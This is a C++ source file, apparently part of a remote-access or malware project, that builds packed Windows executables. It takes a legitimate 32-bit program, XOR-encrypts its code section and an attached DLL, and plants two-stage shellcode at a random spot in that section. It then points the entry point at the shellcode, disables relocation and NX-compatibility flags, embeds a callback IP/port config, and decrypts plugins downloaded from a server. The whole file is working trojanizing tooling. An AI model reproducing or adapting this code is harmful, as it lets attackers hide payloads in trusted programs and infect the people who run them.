#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "Lightbone/utils.h"
#include "Lightbone/api_resolver.h"
#include <pe_bliss.h>
#include <pe_bliss_resources.h>
#include <fstream>
#include <string>
#include <iostream>
#include "loader.h"
#include "packer.h"

#include "Service/SubServicePackage.h"
#include "Service/NetUtils.h"

using namespace pe_bliss;
using namespace Utils::Crypto;
using namespace ApiResolver;

pe_types_class_32::NtHeaders& get_nt_headers_32_ptr(pe_base* base)
{
    return *(pe_types_class_32::NtHeaders*)base->get_nt_headers_ptr();
}
bool copy_append_data(const std::string& target_file_path, const std::string& output_file_path)
{
    std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
    pe_base image(pe_factory::create_pe(pe_file));
    const section_list& pe_sections = image.get_image_sections();
    pe_sections.back().get_pointer_to_raw_data();
    pe_file.seekg(0, pe_file.end);
    size_t pe_file_size = pe_file.tellg();
    size_t pe_file_image_end = pe_sections.back().get_size_of_raw_data() + pe_sections.back().get_pointer_to_raw_data();
    if (pe_file_size == pe_file_image_end)
        return false;
    pe_file.seekg(pe_file_image_end);
    size_t append_data_size = pe_file_size - pe_file_image_end;
    std::unique_ptr<unsigned char[]> append_data(new unsigned char[append_data_size]);
    pe_file.read((char*)append_data.get(), append_data_size);
    std::ofstream output(output_file_path, std::ios::out | std::ios::binary | std::ios::app);
    output.seekp(0, output.end);
    output.write((char*)append_data.get(), append_data_size);
    pe_file.close();
    output.close();
    return true;
}
void copy_option_headers(pe_base* source, pe_base* dest)
{
    get_nt_headers_32_ptr(dest).OptionalHeader.BaseOfCode
        = get_nt_headers_32_ptr(source).OptionalHeader.BaseOfCode;
    get_nt_headers_32_ptr(dest).OptionalHeader.BaseOfData
        = get_nt_headers_32_ptr(source).OptionalHeader.BaseOfData;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfCode
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfCode;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfInitializedData
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfInitializedData;
    get_nt_headers_32_ptr(dest).OptionalHeader.SizeOfUninitializedData
        = get_nt_headers_32_ptr(source).OptionalHeader.SizeOfUninitializedData;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorLinkerVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorLinkerVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorImageVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorImageVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorOperatingSystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorOperatingSystemVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MajorSubsystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MajorSubsystemVersion;

    get_nt_headers_32_ptr(dest).OptionalHeader.MinorLinkerVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorLinkerVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorImageVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorImageVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorOperatingSystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorOperatingSystemVersion;
    get_nt_headers_32_ptr(dest).OptionalHeader.MinorSubsystemVersion
        = get_nt_headers_32_ptr(source).OptionalHeader.MinorSubsystemVersion;
}
/**
 * @brief 构建打包文件
 * 
 * @param target_file_path 目标文件路径
 * @param dll_path DLL文件路径
 * @param output_file_path 输出文件路径
 * @param stage_1_payload 第一阶段有效载荷
 * @param stage_2_payload 第二阶段有效载荷
 * @param config 配置文件路径
 * @return true 构建成功
 * @return false 构建失败
 */
bool build_packfile(const std::string& target_file_path, 
    const std::string& dll_path, 
    const std::string& output_file_path,
    const std::string& stage_1_payload,
    const std::string& stage_2_payload,
    const std::string& config)
{
    // 打开目标PE文件
    std::ifstream pe_file(target_file_path, std::ios::in | std::ios::binary);
    if (!pe_file)
    {
        return false;
    }
    // 创建PE文件对象
    pe_base image(pe_factory::create_pe(pe_file));
    // 检查PE文件类型是否为32位
    if (image.get_pe_type() == pe_type_64)
    {
        return false;
    }
    // 创建新的PE文件对象
    pe_base new_image(pe_properties_32(), image.get_section_alignment());

    // 设置PE文件的特征和属性
    new_image.set_characteristics(image.get_characteristics());
    new_image.set_dll_characteristics(image.get_dll_characteristics());
    new_image.set_file_alignment(image.get_file_alignment());
    new_image.set_heap_size_commit(image.get_heap_size_commit_64());
    new_image.set_heap_size_reserve(image.get_heap_size_reserve_64());
    new_image.set_stack_size_commit(image.get_stack_size_commit_64());
    new_image.set_stack_size_reserve(image.get_stack_size_reserve_64());
    new_image.set_image_base_64(image.get_image_base_64());
    new_image.set_ep(image.get_ep());
    new_image.set_number_of_rvas_and_sizes(new_image.pe_base::get_number_of_rvas_and_sizes());
    new_image.set_subsystem(image.get_subsystem());
    new_image.set_time_date_stamp(image.get_time_date_stamp());

    // 复制可选头信息
    copy_option_headers(&image, &new_image);

    for (unsigned long i = 0; i < image.get_number_of_rvas_and_sizes(); ++i)
    {
        if (i == pe_win::image_directory_entry_bound_import)
        {
            new_image.set_directory_rva(i, 0);
            new_image.set_directory_size(i, 0);
        }
        else
        {
            new_image.set_directory_rva(i, image.get_directory_rva(i));
            new_image.set_directory_size(i, image.get_directory_size(i));
        }
    }

    // 复制节信息
    {
        const section_list& pe_sections = image.get_image_sections();
        for (section_list::const_iterator it = pe_sections.begin(); it != pe_sections.end(); ++it)
        {
            if (it->get_name() == ".reloc")
            {
                continue;
            }
            if (it->get_name() == ".rsrc")
            {
                continue;
            }
            new_image.set_section_virtual_size(new_image.add_section(*it), (*it).get_virtual_size());
        }
    }

    // 设置随机种子
    srand(::GetTickCount());
    // 创建加密代码节
    section crypt_code_section;
    crypt_code_section.get_raw_data().resize(1);
    crypt_code_section.set_name(".mapo");
    crypt_code_section.readable(true);

    // 共享数据结构
    share_data_t share = { kShareDateMagicKey,
    { 0xE8, 0, 0, 0, 0 },
    0xE8, 
     // 减去ret_opcode的大小,也就是stage_1_payload的地址,也就是call _loader_entry函数
    sizeof(share_data_t) - offsetof(share_data_t, ret_opcode),
    0xC3 };

    share.stage = 0;
    // 初始化并填充shellcode
    std::string shellcode;
    shellcode.resize(sizeof(share) + stage_1_payload.size() + stage_2_payload.size());
    share.oep = image.get_ep();
    share.xor_key = rand();
    share.origin_image_base = image.get_image_base_64();
    memset(share.cfg, 0, sizeof(share.cfg));
    // 加载配置文件
    ProtocolCFGLoader cfg;
    auto json_str = Packer::load_file(config);
    cfg.json = json::parse(json_str);
    auto cfg_bin = cfg.dump();
    share.cfg_size = cfg_bin.size();
    // 检查配置文件大小是否超过限制
    if(cfg_bin.size() > sizeof(share.cfg))
    {
        std::cerr << "cfg too big" << std::endl;
        return false;
    }
    // 复制配置文件数据到共享数据结构
    memcpy(share.cfg, cfg_bin.data(), (std::min)(cfg_bin.size(), sizeof(share.cfg)));
    // 重定位信息记载
    relocation_table_list relocs_tables(get_relocations(image));
    std::map<uint32_t, relocation_table> new_relocs_tables;
    std::vector<reloc_info_t> relocs;

    section code_section = new_image.get_image_sections().front();

    for (auto& table : relocs_tables)
    {
        for (auto& reloc : table.get_relocations())
        {
            if (code_section.get_virtual_address() <= table.get_rva() && table.get_rva() <= (code_section.get_virtual_address() + code_section.get_virtual_size()))
            {
                relocs.push_back({
                    reloc.get_type(),
                    table.get_rva() + reloc.get_rva()
                    });
            }
            else
            {
                new_relocs_tables[table.get_rva()].set_rva(table.get_rva());
                new_relocs_tables[table.get_rva()].add_relocation(reloc);
            }
        }
    }

    relocs_tables.clear();
    for (auto& new_relocs_tables_itor : new_relocs_tables)
    {
        relocs_tables.push_back(new_relocs_tables_itor.second);
    }
    // 创建重定位节
    section new_relocs;
    new_relocs.get_raw_data().resize(1);
    new_relocs.set_name(".reloc");
    new_relocs.readable(true);
    section& attached_section = new_image.add_section(new_relocs);
    rebuild_relocations(new_image, relocs_tables, attached_section);
    // 创建资源节
    resource_directory root(get_resources(image));
    section rsrc;
    rsrc.set_name(".rsrc");
    rsrc.get_raw_data().resize(1);
    rsrc.readable(true);
    rsrc.set_flag(pe_win::image_scn_cnt_initialized_data, true);
    section& attach_rsrc = new_image.add_section(rsrc);
    rebuild_resources(new_image, root, attach_rsrc);

    // 加载DLL文件
    std::ifstream dll_file(dll_path, std::ios::in | std::ios::binary);
    dll_file.seekg(0, dll_file.end);
    const size_t bind_dll_size = dll_file.tellg();
    dll_file.seekg(0);

    const size_t text_code_size = code_section.get_raw_data().size();

    const size_t crypt_code_relocs_size = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t) + text_code_size + bind_dll_size;
    std::unique_ptr<unsigned char[]> crypt_code(new unsigned char[crypt_code_relocs_size]);
    crypt_code_section.get_raw_data().resize(crypt_code_relocs_size);
    ((crypt_code_ptr_t)crypt_code.get())->text_code_size = text_code_size;
    ((crypt_code_ptr_t)crypt_code.get())->bind_dll_size = bind_dll_size;
    ((crypt_code_ptr_t)crypt_code.get())->reloc_size = relocs.size();
    int n = 0;
    for (auto& reloc : relocs)
    {
        ((crypt_code_ptr_t)crypt_code.get())->reloc[n].rva = reloc.rva;
        ((crypt_code_ptr_t)crypt_code.get())->reloc[n].type = reloc.type;
        n++;
    }
    const size_t text_code_offset = offsetof(crypt_code_t, reloc) + relocs.size() * sizeof(reloc_info_t);
	memcpy(crypt_code.get() + text_code_offset, code_section.get_raw_data().data(), text_code_size);

    if (bind_dll_size)
    {
        dll_file.read((char*)(crypt_code.get() + text_code_offset + text_code_size), bind_dll_size);
    }

    memcpy(crypt_code_section.get_raw_data().data(), crypt_code.get(), crypt_code_relocs_size);

    Utils::Crypto::xor_buffer(crypt_code_section.get_raw_data().data(), crypt_code_section.get_raw_data().size(), share.xor_key);
    section& bind_crypt_code_section = new_image.add_section(crypt_code_section);
    share.crypt_code_rva = bind_crypt_code_section.get_virtual_address();
    share.crypt_code_size = bind_crypt_code_section.get_raw_data().size();

    /*
    这行C++代码执行了一个特定的计算，用于生成一个名为 `random` 的整型变量值。这个值基于两个不同数据大小的计算：`shellcode.size()` 和 
    `code_section.get_raw_data().size()`。下面是对这行代码的详细解释：

    1. **`shellcode.size()`**:
       - 这部分调用了 `shellcode` 对象的 `size()` 成员函数。`shellcode` 很可能是一个存储了某种数据（比如shellcode，即一段用于在目标系统
       上执行特定任务的机器码）的容器（如 `std::vector`、`std::string` 等）。`size()` 函数返回容器中元素的数量，对于 `std::string` 或字
       节数组来说，这通常意味着数据的字节数。

    2. **`code_section.get_raw_data().size()`**:
       - 这里，`code_section` 似乎是一个对象，它有一个成员函数 `get_raw_data()`。这个函数返回一个容器或类似的数据结构，该结构包含了
       `code_section` 的原始数据。然后，对这个返回的数据结构调用了 `size()` 函数，以获取其大小（即元素的数量或字节数）。

    3. **`(rand() % (code_section.get_raw_data().size() - shellcode.size()))`**:
       - `rand()` 是一个标准库函数，用于生成一个伪随机数。这个随机数通常是一个相对较大的整数。
       - `%` 是取模运算符，用于计算左侧数除以右侧数的余数。在这里，它用于生成一个在 `0` 到
       `(code_section.get_raw_data().size() - shellcode.size() - 1)` 范围内的随机整数。这意味着，如果 `code_section` 的数据大小远大于
       `shellcode` 的大小，这个表达式将生成一个相对较小的随机数。

    4. **`shellcode.size() + ...`**:
       - 最后，将 `shellcode.size()` 的值与上述随机数相加。这样，`random` 的值将是一个至少等于 `shellcode.size()` 的数，且最大不超过
       `code_section.get_raw_data().size()`（如果 `shellcode.size()` 不为零）。

    **目的和用途**：

    这行代码的目的可能是为了在一个更大的数据块（`code_section.get_raw_data()`）中，基于 `shellcode` 的大小，随机选择一个起始位置来插入
    或操作 `shellcode`。通过确保 `random` 的值至少等于 `shellcode.size()`，代码可能旨在避免在选择的位置没有足够的空间来容纳 `shellcode`。
    然而，这种计算方式也假设 `code_section.get_raw_data().size()` 大于或等于 `2 * shellcode.size()`（为了处理 `rand()` 可能产生的零值情
    况，尽管由于取模运算，零值实际上不会直接产生，但接近零的小值仍可能导致空间不足的问题，除非有额外的检查）。

    */
    int random = shellcode.size() + (rand() % (code_section.get_raw_data().size() - shellcode.size()));

    share.stub_rva = random;
    share.stub_size = shellcode.size();
    share.stub_entry_rva = sizeof(share_data_t) + stage_1_payload.size();

    // shellcode.data() = share + stage_1_payload + stage_2_payload;
	memcpy((void*)shellcode.data(), &share, sizeof(share));
	memcpy((unsigned char*)shellcode.data() + sizeof(share), stage_1_payload.data(), stage_1_payload.size());
	memcpy((unsigned char*)shellcode.data() + sizeof(share) + stage_1_payload.size(), stage_2_payload.data(), stage_2_payload.size());

    //清空代码段
    //memset((void*)new_image.get_image_sections().front().get_raw_data().data(), 0xCC, code_section.get_raw_data().size());

    // 验证导入表在image的有效节区内，并将image中的导入表数据复制到new_image中的对应位置。
    if (image.get_image_sections().front().get_virtual_address() <= image.get_directory_rva(pe_win::image_directory_entry_import)
        && image.get_directory_rva(pe_win::image_directory_entry_import) <= image.get_image_sections().front().get_virtual_size())
    {
        section& old_text = image.get_image_sections().front();
        section& text = new_image.get_image_sections().front();
        memcpy(text.get_raw_data().data() + image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address(),
            old_text.get_raw_data().data() + image.get_directory_rva(pe_win::image_directory_entry_import) - old_text.get_virtual_address(),
            text.get_raw_data().size() - (image.get_directory_rva(pe_win::image_directory_entry_import) - text.get_virtual_address()));
    }

	//写入目标文件代码段
	memcpy((void*)(new_image.get_image_sections().front().get_raw_data().data() + random), shellcode.data(), shellcode.size());

    new_image.set_ep(new_image.get_image_sections().front().get_virtual_address() + random + offsetof(share_data_t, eip_opcode));

    //关闭重定位
    new_image.set_characteristics_flags(pe_bliss::pe_win::image_file_relocs_stripped);
    new_image.clear_characteristics_flags(pe_bliss::pe_win::image_dllcharacteristics_nx_compat);

    std::stringstream temp_pe(std::ios::out | std::ios::in | std::ios::binary);
    rebuild_pe(new_image, temp_pe);
    //new_image->set_checksum(calculate_checksum(temp_pe));

    std::ofstream new_pe_file(output_file_path.c_str(), std::ios::out | std::ios::binary | std::ios::trunc);
    if (new_pe_file.is_open() == false)
    {
        std::cerr << "文件占用" << std::endl;
        return false;
    }
        
    rebuild_pe(new_image, new_pe_file);
    new_pe_file.close();

    copy_append_data(target_file_path, output_file_path);
    return true;
}

void make_template_cfg(const std::string& output)
{
    ProtocolCFGLoader cfg;
    cfg.set_field(ip_field_id, "127.0.0.1");
    cfg.set_field(port_field_id, kDefaultServicePort);
    cfg.set_field(test_mode_field_id, false);
    cfg.set_field(sec_no_change_field_id, true);
    std::ofstream file(output, std::ios::out | std::ios::binary);
    auto msg = cfg.json.dump();
    file.write(msg.data(), msg.size());
    file.close();
}

void expand_cache_dll(const std::string& src, const std::string& dst)
{
    auto buf = Packer::load_file(src);
    RawProtocolImpl package;
    package.decode(buf);
    auto raw_msg = msgpack::unpack((char*)package.body.buffer.data(), package.body.buffer.size());
    auto plugin = raw_msg.get().as<ProtocolS2CDownloadPlugin>();
    if (plugin.is_crypted)
    {
        xor_buffer(plugin.data.data(), plugin.data.size(), kProtocolXorKey);
    }
    std::ofstream output(dst, std::ios::out | std::ios::binary);
    output.write((char*)plugin.data.data(), plugin.data.size()); 
}
